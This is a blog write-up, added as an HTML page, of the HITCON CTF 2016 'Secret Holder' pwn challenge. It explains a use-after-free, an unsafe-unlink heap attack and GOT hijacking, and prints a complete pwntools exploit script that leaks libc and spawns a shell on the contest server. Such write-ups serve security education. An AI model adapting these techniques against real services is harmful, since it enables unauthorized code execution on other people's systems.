@@ -1,0 +1,712 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HITCON CTF 2016 Quals – Secret Holder - Hacking Tube 2.0</title>
+<meta name="description" content="Category: pwnPoints: 100">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="HITCON CTF 2016 Quals – Secret Holder">
+<meta property="og:url" content="http://0.0.0.0:4000/hitcon-ctf-2016-quals-secret-holder/">
+
+
+  <meta property="og:description" content="Category: pwnPoints: 100">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2016-10-10T16:10:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/hitcon-ctf-2016-quals-secret-holder/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HITCON CTF 2016 Quals – Secret Holder">
+    <meta itemprop="description" content="Category: pwnPoints: 100">
+    <meta itemprop="datePublished" content="October 10, 2016">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HITCON CTF 2016 Quals – Secret Holder
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> pwn
+<strong>Points:</strong> 100</p>
+
+<!-- more -->
+
+<p>I did not finish the challenge during the contest, but was able to solve it after the game. Damn if only I can fuzz some more…</p>
+
+<p>64 bit ELF,  with Partial RELRO, canary &amp; NX enabled, no PIE.<br />
+Program allow us to:</p>
+
+<ul>
+  <li>keep secret : new a secret ( using <code class="highlighter-rouge">calloc()</code> )</li>
+  <li>wipe secret : delete a secret</li>
+  <li>renew secret : edit a secret</li>
+</ul>
+
+<p>There are three kinds of secret in the program:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">small</code> : secret with buffer size 40</li>
+  <li><code class="highlighter-rouge">big</code> : secret with buffer size 4,000</li>
+  <li><code class="highlighter-rouge">huge</code> : secret with buffer size 400,000</li>
+</ul>
+
+<p>There’s a Use-After-Free vulnerability in the <code class="highlighter-rouge">wipe</code> function:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v0</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+<span class="k">switch</span> <span class="p">(</span> <span class="n">v0</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">secret_buf_big</span><span class="p">);</span>
+        <span class="n">has_keep_big</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">secret_buf_huge</span><span class="p">);</span>
+        <span class="n">has_keep_huge</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">secret_buf_small</span><span class="p">);</span>
+        <span class="n">has_keep_small</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>When wiping a secret, it does not check the <code class="highlighter-rouge">has_keep_XXX</code> flag ( a flag that indicates now there’s a small/big/huge secret in the program). So for example if we <code class="highlighter-rouge">keep(small)</code> –&gt; <code class="highlighter-rouge">wipe(small)</code> –&gt; <code class="highlighter-rouge">keep(big)</code> –&gt; <strong><code class="highlighter-rouge">wipe(small)</code></strong>, it will free the <code class="highlighter-rouge">big</code> buffer, but we can still <code class="highlighter-rouge">renew(big)</code></p>
+
+<p>During the contest I did not know how to exploit the service. I successfully overlapped the <code class="highlighter-rouge">small</code> and the <code class="highlighter-rouge">big</code> buffer, but it only made me able to overwrite the top_size, which is useless since we can’t control the size of the <code class="highlighter-rouge">calloc</code> function ( thus we can’t do the <a href="https://github.com/shellphish/how2heap/blob/master/house_of_force.c">House of Force</a> attack ). I was also failed to overlapped these two buffer with the different base address ( that is, I can only overlapped <code class="highlighter-rouge">small</code> &amp; <code class="highlighter-rouge">big</code> with the same base heap address), so I was unable to overflow the heap buffer and overwrite the chunk header.</p>
+
+<p>After I asked the author of this challege, I realize that the key point of solving this challenge is to <strong>exploit the <code class="highlighter-rouge">huge</code> and the <code class="highlighter-rouge">big</code>’s memory chunk</strong>.</p>
+
+<p>While solving this challenge, I thought that if the malloc size was larger than <code class="highlighter-rouge">0x20000</code>, glibc will always use <code class="highlighter-rouge">mmap</code> to allocate the memory space. But I was wrong – if we <code class="highlighter-rouge">keep(huge)</code>–&gt; <code class="highlighter-rouge">wipe(huge)</code>–&gt; <code class="highlighter-rouge">keep(huge)</code>, we will found that the second <code class="highlighter-rouge">huge</code> buffer was allocated by the <code class="highlighter-rouge">malloc</code> function, not <code class="highlighter-rouge">mmap</code> !! ( Thanks to the god damn <code class="highlighter-rouge">sysmalloc</code> !! )</p>
+
+<p>So here’s how we gonna exploit it:</p>
+
+<ul>
+  <li>Use <code class="highlighter-rouge">keep</code> and <code class="highlighter-rouge">wipe</code> to make <code class="highlighter-rouge">small</code> &amp; <code class="highlighter-rouge">huge</code> buffer be on the same heap address.</li>
+  <li><code class="highlighter-rouge">keep(big)</code> and make <code class="highlighter-rouge">big</code> buffer adjacent to the end of the <code class="highlighter-rouge">small</code> buffer.</li>
+  <li>By doing <code class="highlighter-rouge">renew(huge)</code>, we’ll be able to overflow the whole <code class="highlighter-rouge">big</code> buffer, thus we can create a fake <strong>smallbin</strong> memory chunk at the address of the <code class="highlighter-rouge">big</code> buffer.</li>
+  <li>By creating some fake chunks, we can use the <a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c">unsafe unlink</a> attack to overwrite <code class="highlighter-rouge">&amp;huge_buf</code> ( all three buffer’s address are store in the global data section ), so now the <code class="highlighter-rouge">huge</code>’s buffer will be lying on the global data section.</li>
+  <li>Now we can overwrite all three buffer address ( data pointer ) by doing <code class="highlighter-rouge">renew(huge)</code></li>
+  <li><code class="highlighter-rouge">renew(small/huge/big)</code> to overwrite the content of any address.</li>
+</ul>
+
+<p>After we overwrite the <code class="highlighter-rouge">huge</code>’s buffer address, we can try to do the GOT hijacking attack. But first we’ll have to leak some address. The program itself did not output any of our input , so I decide to hijack  <code class="highlighter-rouge">free</code>’s GOT first.</p>
+
+<p>By overwriting <code class="highlighter-rouge">free</code>’s GOT into <code class="highlighter-rouge">puts@plt</code>, and <code class="highlighter-rouge">small</code>’s buffer into <code class="highlighter-rouge">__libc_start_main@got.plt</code>, we are able to leak the libc’s address by doing <code class="highlighter-rouge">wipe(small)</code>, since it’ll call <code class="highlighter-rouge">free(small)</code>, which is now <code class="highlighter-rouge">puts(_libc_start_main@got.plt)</code>.</p>
+
+<p>After that we’re able to overwrite some GOT and hijack the control flow. Here I overwrite <code class="highlighter-rouge">puts</code>’s GOT into the address of the <a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf">one-gadget</a>, which will make the program spawn a shell whenever it tries to call <code class="highlighter-rouge">puts</code> to print out some message.</p>
+
+<p>```python exp_secret.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “52.68.31.117”
+PORT = 5566
+ELF_PATH = “./secret_holder_noalarm”
+LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”</p>
+
+<h1 id="setting">setting</h1>
+<p>context.arch = ‘amd64’
+context.os = ‘linux’
+context.endian = ‘little’
+context.word_size = 32</p>
+<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
+<p>context.log_level = ‘INFO’</p>
+
+<p>elf = ELF(ELF_PATH)
+libc = ELF(LIBC_PATH)</p>
+
+<p>def my_recvuntil(s, delim):
+    res = “”
+    while delim not in res:
+        c = s.recv(1)
+        res += c
+        sys.stdout.write(c)
+        sys.stdout.flush()
+    return res</p>
+
+<p>def myexec(cmd):
+    return subprocess.check_output(cmd, shell=True)</p>
+
+<p>def keep(ch, secret):
+    r.sendlineafter(“3. Renew secret\n”, “1”)
+    r.sendlineafter(“3. Huge secret\n”, str(ch))
+    r.sendafter(“secret: \n”, secret)</p>
+
+<p>def wipe(ch):
+    r.sendlineafter(“3. Renew secret\n”, “2”)
+    r.sendlineafter(“3. Huge secret\n”, str(ch))</p>
+
+<p>def renew(ch, secret):
+    r.sendlineafter(“3. Renew secret\n”, “3”)
+    r.sendlineafter(“3. Huge secret\n”, str(ch))
+    r.sendafter(“secret: \n”, secret)</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+#r = process(ELF_PATH)
+keep(1, "A"*8)
+keep(2, "A"*8)
+keep(3, "A"*8)
+wipe(1)
+wipe(2)
+wipe(3)
+
+keep(3, "3"*8) # now huge chunk will use malloc, not mmap!!
+wipe(1)
+keep(1, "A"*8) # now huge = small
+keep(2, "2"*8) # big will adjacent to the end of the small buffer
+
+# 0x6020a8 stores the huge buffer's address
+fake_fd = 0x6020a8 - 0x18
+fake_bk = 0x6020a8 - 0x10
+
+# overwrite big's chunk data with fake chunk data for unsafe unlink
+payload = p64(0) + p64(0x21) # fake prev_chunk header
+payload += p64(fake_fd) + p64(fake_bk) # fake fd and bk
+payload += p64(0x20) + p64(0x90) # we are going to free here
+payload += "B"*0x80
+payload += p64(0x90) + p64(0x91) # fake next_chunk header
+payload += "C"*0x80
+payload += p64(0x90) + p64(0x91) # fake next_next_chunk header
+renew(3, payload)
+
+wipe(2) # free big, trigger unsafe unlink
+
+# now huge_buf will point to global data section
+# renew huge, overwrite small, big &amp; huge buffer address
+payload = "A"*0x10
+payload += p64(0)
+payload += p64(0x6020b0) # &amp;small_buf
+payload += p64(elf.got['free'])
+renew(3, payload)
+
+renew(1, p64(elf.plt['puts'])) # make free(buf) = puts(buf)
+
+# make small_buf = libc_start_main got
+# wipe(small) = puts(small) = puts(got) = leak address
+payload = p64(elf.got['__libc_start_main']) + p32(1)*3
+renew(3, payload)
+wipe(1)
+libc.address += u64(r.recvline().strip().ljust(8, "\x00")) - libc.symbols['__libc_start_main']
+one_gadget = libc.address + 0x4525a
+log.success("libc_base: "+hex(libc.address))
+log.success("one_gadget: "+hex(one_gadget))
+
+# hijack puts@got.plt, make it jump to one_gadget
+payload = p64(elf.got['puts']) + p32(1)*3
+renew(3, payload)
+renew(1, p64(one_gadget))
+
+r.interactive()
+</code></pre></div></div>
+
+<p>```</p>
+
+<p>Such a shame that I didn’t solve this challenge …… I might be able to solve it if I did some more fuzzing…..</p>
+
+<p>flag: <code class="highlighter-rouge">hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap-overflow" class="page__taxonomy-item" rel="tag">heap_overflow</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hitcon" class="page__taxonomy-item" rel="tag">HITCON</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#use-after-free" class="page__taxonomy-item" rel="tag">use_after_free</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-10-10T16:10:00+08:00">October 10, 2016</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HITCON+CTF+2016+Quals+--+Secret+Holder%20http%3A%2F%2F0.0.0.0%3A4000%2Fhitcon-ctf-2016-quals-secret-holder%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fhitcon-ctf-2016-quals-secret-holder%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fhitcon-ctf-2016-quals-secret-holder%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/869100/" class="pagination--pager" title="ASIS CTF Finals 2016 – shadow
+">Previous</a>
+    
+    
+      <a href="/hitcon-ctf-2016-quals-flame/" class="pagination--pager" title="HITCON CTF 2016 Quals – flame
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hitcon-ctf-2016-quals-secret-holder/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/hitcon-ctf-2016-quals-secret-holder"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
